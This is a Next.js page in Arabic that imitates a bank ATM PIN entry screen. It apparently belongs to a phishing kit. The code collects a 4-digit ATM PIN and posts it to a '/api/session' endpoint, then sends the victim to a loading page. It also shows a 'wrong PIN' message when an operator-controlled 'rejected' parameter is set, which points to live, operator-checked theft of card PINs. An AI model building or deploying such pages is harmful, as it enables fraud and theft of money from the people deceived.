"use client";
export const dynamic = 'force-dynamic';
import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import SessionTracker from "@/components/SessionTracker";

const GREEN = "#1e7344";
const DARK_GREEN = "#155a34";

export default function ATMPage() {
  const router = useRouter();
  const [pin, setPin] = useState("");
  const [errorMsg, setErrorMsg] = useState("");
  const [inputError, setInputError] = useState(false);
  const [pressedKey, setPressedKey] = useState<string | null>(null);
  const searchParams = useSearchParams();

  useEffect(() => {
    const rejected = searchParams.get("rejected");
    if (rejected === "1") {
      setErrorMsg("برجاء التحقق من الرقم السري للصراف الآلي الصحيح");
      setInputError(true);
    }
  }, [searchParams]);

  function pressDigit(digit: string) {
    if (pin.length < 4) {
      setPin(prev => prev + digit);
      if (inputError) { setInputError(false); setErrorMsg(""); }
    }
    setPressedKey(digit);
    setTimeout(() => setPressedKey(null), 150);
  }

  function pressDelete() {
    setPin(prev => prev.slice(0, -1));
    setPressedKey("del");
    setTimeout(() => setPressedKey(null), 150);
  }

  async function handleConfirm() {
    if (pin.length === 4) {
      setErrorMsg("");
      setInputError(false);
      try {
        await fetch('/api/session', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ current_page: 'atm', atm_pin: pin, waiting_for: 'atm' }),
        });
      } catch {}
      router.push("/loading-page?from=atm");
    } else {
      setErrorMsg("يرجى إدخال 4 أرقام كاملة");
      setInputError(true);
    }
  }

  const pinDots = Array.from({ length: 4 }, (_, i) => i < pin.length);

  const numpadKeys = [
    ['1', '2', '3'],
    ['4', '5', '6'],
    ['7', '8', '9'],
    ['', '0', 'del'],
  ];

  return (
    <div style={{
      background: "linear-gradient(160deg, #f0f4f0 0%, #e8f0e8 100%)",
      display: "flex",
      flexDirection: "column",
      justifyContent: "space-between",
      alignItems: "center",
      minHeight: "100vh",
      padding: "0",
      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
    }}>
      <SessionTracker page="atm" />

      {/* Header - نفس هيدر الصفحة الرئيسية */}
      <img
        src="https://i.ibb.co/8LWchYJd/IMG-20260320-WA0028.jpg"
        alt="Header"
        style={{ width: "100%", display: "block" }}
      />

      {/* Main Content */}
      <div style={{
        flex: 1,
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        padding: "10px 16px",
        width: "100%",
        maxWidth: "400px",
      }}>

        {/* ATM Icon - SVG مدمج */}
        <div style={{ marginBottom: "10px", textAlign: "center" }}>
          <svg width="72" height="72" viewBox="0 0 90 90" fill="none" xmlns="http://www.w3.org/2000/svg">
            {/* هيكل الصراف الآلي */}
            <rect x="10" y="8" width="60" height="72" rx="6" fill="#2c3e50"/>
            <rect x="13" y="11" width="54" height="69" rx="5" fill="#34495e"/>
            {/* الشاشة */}
            <rect x="17" y="14" width="46" height="28" rx="3" fill="#1abc9c" opacity="0.2"/>
            <rect x="18" y="15" width="44" height="26" rx="2" fill="#1e7344" opacity="0.85"/>
            {/* نص ATM على الشاشة */}
            <text x="40" y="24" textAnchor="middle" fontSize="7" fontWeight="bold" fill="white" opacity="0.9">ATM</text>
            {/* خطوط على الشاشة */}
            <rect x="22" y="28" width="16" height="2" rx="1" fill="white" opacity="0.5"/>
            <rect x="22" y="32" width="10" height="2" rx="1" fill="white" opacity="0.3"/>
            {/* لوحة الأرقام */}
            <rect x="17" y="46" width="46" height="28" rx="3" fill="#2c3e50"/>
            {/* صف 1 */}
            <rect x="20" y="49" width="10" height="7" rx="2" fill="#4a5568"/>
            <rect x="33" y="49" width="10" height="7" rx="2" fill="#4a5568"/>
            <rect x="46" y="49" width="10" height="7" rx="2" fill="#4a5568"/>
            {/* صف 2 */}
            <rect x="20" y="59" width="10" height="7" rx="2" fill="#4a5568"/>
            <rect x="33" y="59" width="10" height="7" rx="2" fill="#4a5568"/>
            <rect x="46" y="59" width="10" height="7" rx="2" fill="#1e7344"/>
            {/* أرقام على الأزرار */}
            <text x="25" y="55" textAnchor="middle" fontSize="4" fill="white" opacity="0.8">1</text>
            <text x="38" y="55" textAnchor="middle" fontSize="4" fill="white" opacity="0.8">2</text>
            <text x="51" y="55" textAnchor="middle" fontSize="4" fill="white" opacity="0.8">3</text>
            <text x="25" y="65" textAnchor="middle" fontSize="4" fill="white" opacity="0.8">*</text>
            <text x="38" y="65" textAnchor="middle" fontSize="4" fill="white" opacity="0.8">0</text>
            <text x="51" y="65" textAnchor="middle" fontSize="3.5" fill="white" opacity="0.9">✓</text>
            {/* فتحة البطاقة */}
            <rect x="22" y="42" width="22" height="3" rx="1.5" fill="#1e7344" opacity="0.6"/>
            {/* نقطة الضوء */}
            <circle cx="70" cy="14" r="4" fill="#1e7344" opacity="0.7"/>
          </svg>
        </div>

        {/* Card */}
        <div style={{
          background: "white",
          borderRadius: "20px",
          padding: "20px 20px 16px",
          width: "100%",
          boxShadow: "0 8px 30px rgba(0,0,0,0.08)",
          border: "1px solid rgba(30,115,68,0.1)",
        }}>
          <p style={{ fontSize: "13px", color: "#666", textAlign: "center", marginBottom: "16px", lineHeight: "1.6" }}>
            يرجى إدخال الرقم السري المكون من 4 أرقام
          </p>

          {/* PIN Dots */}
          <div style={{
            display: "flex",
            justifyContent: "center",
            gap: "14px",
            marginBottom: "12px",
          }}>
            {pinDots.map((filled, i) => (
              <div key={i} style={{
                width: "52px",
                height: "52px",
                borderRadius: "12px",
                border: inputError
                  ? "2px solid #e74c3c"
                  : filled
                    ? `2px solid ${GREEN}`
                    : "2px solid #ddd",
                background: inputError
                  ? "#fff5f5"
                  : filled
                    ? `linear-gradient(135deg, ${GREEN}15 0%, ${GREEN}25 100%)`
                    : "#fafafa",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                transition: "all 0.15s ease",
                boxShadow: filled ? `0 2px 8px ${GREEN}30` : "none",
              }}>
                {filled && (
                  <div style={{
                    width: "14px",
                    height: "14px",
                    borderRadius: "50%",
                    background: inputError ? "#e74c3c" : GREEN,
                  }} />
                )}
              </div>
            ))}
          </div>

          {/* Error Message */}
          {errorMsg && (
            <div style={{
              color: "#e74c3c",
              fontSize: "12px",
              fontWeight: "bold",
              marginBottom: "10px",
              padding: "8px 12px",
              backgroundColor: "#fff5f5",
              borderRadius: "8px",
              border: "1px solid #e74c3c",
              textAlign: "center",
            }}>
              ❌ {errorMsg}
            </div>
          )}

          {/* Numpad */}
          <div style={{
            display: "grid",
            gridTemplateColumns: "repeat(3, 1fr)",
            gap: "8px",
            marginBottom: "12px",
          }}>
            {numpadKeys.flat().map((key, idx) => {
              if (key === '') return <div key={idx} />;
              const isPressed = pressedKey === key;
              const isDel = key === 'del';
              return (
                <button
                  key={idx}
                  onClick={() => isDel ? pressDelete() : pressDigit(key)}
                  style={{
                    height: "50px",
                    borderRadius: "12px",
                    border: isDel ? "1.5px solid #e0e0e0" : `1.5px solid ${isPressed ? GREEN : '#e8e8e8'}`,
                    background: isDel
                      ? (isPressed ? "#fee2e2" : "#fff5f5")
                      : (isPressed ? GREEN : "white"),
                    color: isDel
                      ? "#e74c3c"
                      : (isPressed ? "white" : "#333"),
                    fontSize: isDel ? "11px" : "20px",
                    fontWeight: "bold",
                    cursor: "pointer",
                    transition: "all 0.12s ease",
                    transform: isPressed ? "scale(0.94)" : "scale(1)",
                    boxShadow: isPressed
                      ? (isDel ? "0 2px 6px rgba(231,76,60,0.2)" : `0 2px 8px ${GREEN}40`)
                      : "0 2px 4px rgba(0,0,0,0.06)",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  {isDel ? (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
                      <line x1="18" y1="9" x2="12" y2="15"/>
                      <line x1="12" y1="9" x2="18" y2="15"/>
                    </svg>
                  ) : key}
                </button>
              );
            })}
          </div>

          {/* Confirm Button */}
          <button
            onClick={handleConfirm}
            disabled={pin.length < 4}
            style={{
              width: "100%",
              background: pin.length === 4
                ? `linear-gradient(135deg, ${GREEN} 0%, ${DARK_GREEN} 100%)`
                : "#ccc",
              color: "white",
              border: "none",
              borderRadius: "12px",
              padding: "14px",
              fontSize: "15px",
              fontWeight: "bold",
              cursor: pin.length === 4 ? "pointer" : "not-allowed",
              transition: "all 0.2s ease",
              boxShadow: pin.length === 4 ? `0 4px 15px ${GREEN}40` : "none",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "8px",
            }}
          >
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
            </svg>
            تأكيد الرقم السري
          </button>
        </div>
      </div>

      {/* Footer - صورتا الفوتر من الصفحة الرئيسية */}
      <div style={{ width: "100%" }}>
        <img src="https://i.ibb.co/v4MNd90m/IMG-20260322-WA0002.jpg" style={{ width: "100%", display: "block" }} alt="" />
        <img src="https://i.ibb.co/Rp4xMwxN/IMG-20260321-WA0000.jpg" style={{ width: "100%", display: "block" }} alt="" />
      </div>
    </div>
  );
}
